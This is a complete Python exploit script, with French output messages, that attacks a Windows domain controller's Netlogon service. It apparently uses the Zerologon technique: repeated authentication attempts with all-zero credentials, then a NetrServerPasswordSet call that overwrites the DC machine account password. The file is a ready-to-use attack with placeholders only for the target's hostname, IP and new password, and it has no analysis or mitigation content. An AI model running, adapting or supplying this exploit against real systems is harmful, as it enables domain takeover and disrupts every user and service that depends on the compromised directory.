#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
from impacket.dcerpc.v5.ndr import NDRCALL
import impacket

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from Cryptodome.Cipher import DES, AES, ARC4

DC_HOSTNAME = ""
DC_IP = ""
DC_MDP = ""

class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ('PrimaryName',nrpc.PLOGONSRV_HANDLE),
        ('AccountName',nrpc.WSTR),
        ('SecureChannelType',nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ('ComputerName',nrpc.WSTR),
        ('Authenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('UasNewPassword',nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )

class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ('ReturnAuthenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('ErrorCode',nrpc.NTSTATUS),
    )

def connexion_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name, dc_mdp):

  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  client_challenge = b'\x00' * 8
  client_credential = b'\x00' * 8
  negotiate_flags = 0x212fffff

  serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_primary_name + '\x00', dc_computer_name + '\x00', client_challenge)
  serverChallenge = serverChallengeResp['ServerChallenge']

  try:
    server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_primary_name + '\x00', dc_account_name+'\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, dc_computer_name + '\x00', client_credential, negotiate_flags)
    sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))
    
    try:
      nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
      nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)
      
      requete = NetrServerPasswordSet()
      requete['PrimaryName'] = dc_primary_name + '\x00'
      requete['AccountName'] = dc_account_name + '\x00'
      requete['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
      requete['ComputerName'] = dc_computer_name + '\x00'

      authenticateur = nrpc.NETLOGON_AUTHENTICATOR()
      authenticateur['Credential'] = client_credential
      authenticateur['Timestamp'] = b"\x00" * 4

      requete["Authenticator"] = authenticateur

      pwdata = impacket.crypto.SamEncryptNTLMHash(unhexlify(dc_mdp), sessionKey)

      requete["UasNewPassword"] = pwdata
      resp = rpc_con.request(requete)
      resp.dump()

    except:
      print(e)
    return rpc_con

  except:
    return None

def setup(dc_hostname, dc_ip, dc_mdp):
  dc_primary_name = '\\\\' + dc_hostname
  dc_computer_name = dc_hostname
  dc_account_name = dc_hostname + '$'

  rpc_con = None

  for attempt in range(0, 1024):
    rpc_con = connexion_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name, dc_mdp)

    if rpc_con != None:
      break

  if rpc_con:
    print('Le mot de passe de l\'utilisateur ' + dc_account_name + ' a été mis à NULL.')
  else:
    print('Echec de la mission.')

if __name__ == '__main__':
    setup(DC_HOSTNAME, DC_IP, DC_MDP)
